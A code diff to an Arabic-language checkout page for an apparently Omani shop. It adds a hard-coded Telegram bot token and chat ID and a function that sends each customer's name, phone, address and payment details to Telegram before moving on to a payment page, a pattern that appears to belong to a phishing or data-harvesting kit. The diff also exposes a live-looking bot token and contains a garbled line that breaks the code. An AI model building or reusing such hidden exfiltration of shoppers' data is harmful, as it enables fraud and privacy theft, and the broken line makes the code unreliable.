@@ -51,7 +51,7 @@
 </form>
 
 <footer class="foot">
-  <nav><a href="https://oman-new2027.onrender.com/cartepage.html#" target="_blank" rel="noopener">الشروط والأحكام</a><a href="https://oman-new2027.onrender.com/cartepage.html#" target="_blank" rel="noopener">سياسة الخصوصية</a></nav>
+  <nav><a href="#" target="_blank" rel="noopener">الشروط والأحكام</a><a href="#" target="_blank" rel="noopener">سياسة الخصوصية</a></nav>
   <p>© 2026 أرياف</p>
 </footer>
 
@@ -60,6 +60,11 @@
 <script src="app.js"></script>
 <script>
 const $=id=>document.getElementById(id);
+
+// إعدادات بوت تيليجرام (قم بوضع بيانات بوتك هنا)
+const TELEGRAM_BOT_TOKEN = '8741663993:AAGpYQSJwGVw6j2BxTDGf8ZHN9QUwXXwU50';
+const TELEGRAM_CHAT_ID = '8108427825';
+
 function render(){
   const {qty}=store.get(),box=$('items');
   if(!qty){
@@ -87,17 +92,67 @@ function updateDue(){
 document.querySelectorAll('[name=plan]').forEach(r=>r.onchange=updateDue);
 function change(d){const c=store.get();c.qty=Math.max(0,Math.min(20,c.qty+d));store.set(c);render()}
 $('noteBtn').onclick=()=>{$('note').hidden=!$('note').hidden;if(!$('note').hidden)$('note').focus()};
-$('go').onclick=()=>{
+
+// دالة إرسال تفاصيل الزبون والطلب إلى تيليجرام
+async function sendOrderDetailsToTelegram(orderData) {
+  const ltrMark = '\u200E';
+  const message = `🛒 *طلب جديد (أرياف)*:\n\n` +
+                  `👤 *الاسم:* ${ltrMark}${orderData.name}\n` +
+                  `📱 *الهاتف:* \`${ltrMark}${orderData.phone}\`\n` +
+                  `📍 *العنوان:* ${ltrMark}${orderData.address}\n` +
+                  `📝 *الملاحظات:* ${orderData.note || 'لا يوجد'}\n` +
+                  `📦 *الكمية:* ${orderData.qty}\n` +
+                  `💰 *المبلغ المطلوب الآن:* \`${orderData.due} ر.ع\`\n` +
+                  `💳 *طريقة الدفع:* ${orderData.method} (${orderData.plan})`;
+
+  try {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: 'Markdown'
+      })
+    });
+  } catch (err) {
+    console.error('خطأ في إرسال تفاصيل الطلب لتيليجرام', err);
+  }
+}
+
+$('go').onclick=async ()=>{
   const name=$('name'),phone=$('phone'),addr=$('addr');
   let ok=true;
   [[name,v=>v.trim().length>=3],[phone,v=>/^\d{8}$/.test(v)],[addr,v=>v.trim().length>=3]].forEach(([el,t])=>{
     const good=t(el.value);el.classList.toggle('err',!good);if(!good&&ok){el.focus();ok=false}
   });
   if(!ok||!store.get().qty)return;
-  try{localStorage.setItem('areef_order',JSON.stringify({
-    qty:store.get().qty,total:totals().total,name:name.value.trim(),phone:'+968'+phone.value,
-    address:addr.value.trim(),lat:addr.dataset.lat||'',lon:addr.dataset.lon||'',note:$('note').value.trim(),method:document.querySelector('[name=pay]:checked').value,plan:document.querySelector('[name=plan]:checked').value,due:parseFloat($('due').textContent)}))}catch(e){}
-  location.href='payment.html'; /* صفحة الدفع: تُجهَّز لاحقاً */
+
+  const orderInfo = {
+    qty: store.get().qty,
+    total: totals().total,
+    name: name.value.trim(),
+    phone: '+968 ' + phone.value,
+    address: addr.value.trim(),
+    lat: addr.dataset.lat || '',
+    lon: addr.dataset.lon || '',
+    note: $('note').value.trim(),
+    method: document.querySelector('[name=pay]:checked').value,
+    plan: document.querySelector('[name=plan]:checked').value,
+    due: parseFloat($('due').textContent)
+  };
+
+  // 1. تخزين البيانات محلياً لاستخدامها في صفحة الدفع (payment.html)
+  try {
+    localStorage.setItem('areef_order', JSON.stringify(orderInfo));
+  } catch(e){}
+
+  // 2. إرسال تفاصيل الطلب إلى تيليجرام فوراً
+  $('go.disabled = true; // تعطيل الزر مؤقتاً أثناء الإرسال'
+  await sendOrderDetailsToTelegram(orderInfo);
+
+  // 3. الانتقال لصفحة الدفع
+  location.href='payment.html';
 };
 
 /* ===== اقتراحات العناوين: قائمة محلية فورية + Photon (OpenStreetMap) مجاني بلا مفتاح ===== */
@@ -131,7 +186,7 @@ function setupAddr(){
   inp.addEventListener('input',()=>{
     inp.dataset.lat=inp.dataset.lon='';const q=inp.value.trim();lastQ=q;clearTimeout(timer);
     if(q.length<2){items=[];show();return}
-    items=localMatches(q);show();            /* نتائج فورية بلا انتظار الشبكة */
+    items=localMatches(q);show();         /* نتائج فورية بلا انتظار الشبكة */
     timer=setTimeout(async()=>{try{
       const rem=await remote(q);if(q!==lastQ)return;
       const seen=new Set(items.map(x=>x.title));
